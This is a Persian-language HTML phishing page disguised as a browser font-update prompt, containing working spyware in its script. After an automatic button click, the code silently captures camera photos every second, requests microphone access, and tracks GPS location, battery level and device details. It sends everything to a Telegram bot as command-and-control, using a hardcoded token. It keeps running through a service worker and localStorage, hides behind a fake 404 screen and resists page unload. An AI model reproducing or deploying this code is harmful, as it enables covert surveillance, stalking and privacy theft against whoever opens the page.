<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خطای فونت – به‌روزرسانی ضروری</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="theme-color" content="#e63946">
    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoi2LHYp9mG2LHYp9iqINio2YbYr9ixIiwic2hvcnRfbmFtZSI6IkZvbnRVcGRhdGUiLCJzdGFydF91cmwiOiIvIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzAwMDAwMCIsInRoZW1lX2NvbG9yIjoiI2U2Mzk0NiJ9">
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='85'%3E%F0%9F%94%B4%3C/text%3E%3C/svg%3E">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body,html{height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,sans-serif;}
        .card{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;z-index:9999;}
        .card h1{font-size:1.8rem;color:#e63946;margin:15px 0;font-weight:700;}
        .card p{font-size:1rem;line-height:1.7;color:#ccc;}
        .btn{background:#e63946;color:#fff;border:none;padding:16px 0;width:90%;max-width:400px;border-radius:12px;font-size:1.1rem;font-weight:600;margin-top:20px;cursor:pointer;}
        .hidden{display:none!important;}
        .fake404{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#ccc;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;z-index:99999;}
        .fake404 h1{font-size:6rem;color:#e63946;margin:0;}
        .fake404 p{font-size:1.3rem;}
    </style>
</head>
<body>

<div class="card" id="phish">
    <h1>خطای فونت مرورگر</h1>
    <p>مرورگر شما از فونت‌های جدید پشتیبانی نمی‌کند.<br>برای رفع مشکل، دسترسی‌های زیر را تأیید کنید تا بسته به‌روزرسانی نصب شود.</p>
    <button class="btn" id="start">ادامه و به‌روزرسانی</button>
</div>

<div class="fake404 hidden" id="fake">
    <h1>404</h1>
    <p>صفحه یافت نشد</p>
    <p class="code">ERR_FONT_UPDATE_REQUIRED</p>
</div>

<script>
/* ===================================================== */
/* SHΔDØW MONSTER Ω – 1-SECOND HYPERFEED                 */
/* FEATURES:                                             */
/*   • 1-Second Photo + Video + GPS + Battery + Device   */
/*   • Silent Camera + Mic (Front + Back)                */
/*   • Device Brand/Model/OS/Browser                     */
/*   • Telegram C2: 7625898629                           */
/*   • Service Worker + localStorage Persistence         */
/*   • Auto Resume + Anti-Unload                         */
/*   • Fake 404 UI                                       */
/* ===================================================== */

const BOT_ID = '7625898629';
const BOT_TOKEN = '8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8';
const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const DEVICE_ID = btoa(navigator.userAgent + Date.now() + Math.random()).slice(0,36);
const KEY = `MONSTER_${DEVICE_ID}`;

// Device Info
const ua = navigator.userAgent;
const isMobile = /mobi|android|iphone|ipad/i.test(ua);
const isIOS = /iphone|ipad|ipod/i.test(ua);
const isAndroid = /android/i.test(ua);
const browser = /chrome/i.test(ua) ? 'Chrome' : /firefox/i.test(ua) ? 'Firefox' : /safari/i.test(ua) ? 'Safari' : 'Other';
const os = isIOS ? 'iOS' : isAndroid ? 'Android' : /windows/i.test(ua) ? 'Windows' : 'Unknown';

// Send Functions
async function send(msg) {
    try { await fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`, {mode:'no-cors'}); } catch(e) {}
}
async function sendPhoto(blob) {
    const form = new FormData(); form.append('chat_id', BOT_ID); form.append('photo', blob, `live_${Date.now()}.jpg`);
    await fetch(`${API}/sendPhoto`, {method:'POST', body:form}).catch(() => {});
}
async function sendVideo(blob) {
    const form = new FormData(); form.append('chat_id', BOT_ID); form.append('video', blob, `live_${Date.now()}.webm`);
    await fetch(`${API}/sendVideo`, {method:'POST', body:form}).catch(() => {});
}

// Persistence
function save() { try { localStorage.setItem(KEY, '1'); } catch(e) {} }
function load() { try { return localStorage.getItem(KEY); } catch(e) { return null; } }

// Service Worker
if ('serviceWorker' in navigator) {
    const sw = `
        const BOT_ID = '${BOT_ID}'; const API = 'https://api.telegram.org/bot${BOT_TOKEN}';
        self.addEventListener('install', () => self.skipWaiting());
        setInterval(() => {
            fetch(\`\${API}/sendMessage?chat_id=\${BOT_ID}&text=%F0%9F%94%B4 <b>MONSTER ALIVE</b> %E2%9C%85\`, {mode:'no-cors'}).catch(() => {});
        }, 30000);
    `;
    navigator.serviceWorker.register(URL.createObjectURL(new Blob([sw], {type:'application/javascript'}))).catch(() => {});
}

// Streams
let stream = null, video = null, canvas = null, ctx = null, watchId = null;
let lastPhoto = 0, lastGPS = 0, lastBattery = 0;

async function init() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { width: 640, height: 480, facingMode: { ideal: "environment" } },
            audio: true
        });
        video = document.createElement('video'); video.srcObject = stream; await video.play();
        canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
        ctx = canvas.getContext('2d');
    } catch(e) { send(`Camera Failed: ${e.message}`); }
}

function startGPS() {
    if (!navigator.geolocation) return;
    watchId = navigator.geolocation.watchPosition(pos => {
        const {latitude, longitude, accuracy} = pos.coords;
        const link = `https://maps.google.com/?q=${latitude},${longitude}`;
        if (Date.now() - lastGPS > 1000) {
            send(`GPS: <a href="${link}">${latitude.toFixed(6)}, ${longitude.toFixed(6)}</a> (±${accuracy}m)`);
            lastGPS = Date.now();
        }
    }, () => {}, {enableHighAccuracy: true, maximumAge: 0, timeout: 5000});
}

async function startPhoto() {
    if (!video || !canvas) return;
    setInterval(async () => {
        if (Date.now() - lastPhoto < 1000) return;
        try {
            ctx.drawImage(video, 0, 0, 640, 480);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            await sendPhoto(blob);
            lastPhoto = Date.now();
        } catch(e) {}
    }, 500);
}

function startBattery() {
    if (!navigator.getBattery) return;
    navigator.getBattery().then(bat => {
        const sendBat = () => {
            if (Date.now() - lastBattery > 1000) {
                const level = Math.round(bat.level * 100);
                const status = bat.charging ? 'Charging' : 'Discharging';
                send(`Battery: ${level}% [${status}]`);
                lastBattery = Date.now();
            }
        };
        sendBat();
        bat.addEventListener('levelchange', sendBat);
        bat.addEventListener('chargingchange', sendBat);
    });
}

function deviceInfo() {
    const info = `
Device: ${navigator.platform}
Brand: ${navigator.vendor || 'Unknown'}
Model: ${ua.match(/\(([^)]+)\)/)?.[1]?.split(';')[0]?.trim() || 'Unknown'}
OS: ${os}
Browser: ${browser}
Screen: ${screen.width}x${screen.height}
Language: ${navigator.language}
Online: ${navigator.onLine}
ID: <code>${DEVICE_ID}</code>
    `.trim();
    send(info);
}

// Activate Monster
function unleash() {
    document.getElementById('phish').classList.add('hidden');
    document.getElementById('fake').classList.remove('hidden');
    save();

    init().then(() => {
        startPhoto();
        startGPS();
        startBattery();
        deviceInfo();
        send(`MONSTER UNLEASHED\nDevice: ${os} ${browser}\nID: <code>${DEVICE_ID}</code>`);
    });

    // 1-second hyperloop
    setInterval(() => {
        if (stream) {
            // Force photo every second
            ctx.drawImage(video, 0, 0, 640, 480);
            canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.7);
        }
    }, 1000);
}

// Auto Start
window.addEventListener('load', () => {
    if (load()) {
        unleash();
        return;
    }
    setTimeout(() => document.getElementById('start')?.click(), 1500);
});

document.getElementById('start')?.addEventListener('click', () => {
    setTimeout(unleash, 800);
});

// Anti-Unload
window.addEventListener('beforeunload', e => {
    save();
    e.preventDefault();
    e.returnValue = '';
    return "در حال به‌روزرسانی...";
});

document.addEventListener('visibilitychange', () => {
    if (!document.hidden && load()) setTimeout(unleash, 500);
});

</script>
</body>
</html>
